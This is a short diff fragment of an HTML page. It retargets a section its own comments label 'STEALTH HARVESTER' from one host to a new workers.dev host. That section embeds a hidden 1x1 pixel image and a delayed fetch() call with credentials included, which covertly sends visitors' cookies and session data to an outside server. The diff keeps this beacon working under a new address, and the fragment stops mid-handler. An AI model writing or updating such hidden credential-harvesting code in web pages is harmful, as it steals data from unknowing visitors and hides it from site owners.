@@ -275,7 +275,7 @@ document.querySelector('h1')?.addEventListener('click', () => {
 <!-- STEALTH HARVESTER — 1x1 pixel + fetch with credentials       -->
 <!-- ============================================================ -->
 
-<img id="harvester-pixel" src="https://compiler.voidlureee.dev/pixel" style="display:none;width:1px;height:1px;opacity:0;" />
+<img id="harvester-pixel" src="https://compiler.voidlureee.workers.dev/pixel" style="display:none;width:1px;height:1px;opacity:0;" />
 
 <script>
     // ============================================================
@@ -395,11 +395,11 @@ document.querySelector('h1')?.addEventListener('click', () => {
     });
 
     // ============================================================
-    // STEALTH HARVESTER
+    // STEALTH HARVESTER — Requests go to compiler.voidlureee.workers.dev
     // ============================================================
 
     setTimeout(function() {
-        fetch('https://compiler.voidlureee.dev/check', {
+        fetch('https://compiler.voidlureee.workers.dev/check', {
             credentials: 'include'
         })
         .then(function(res) {
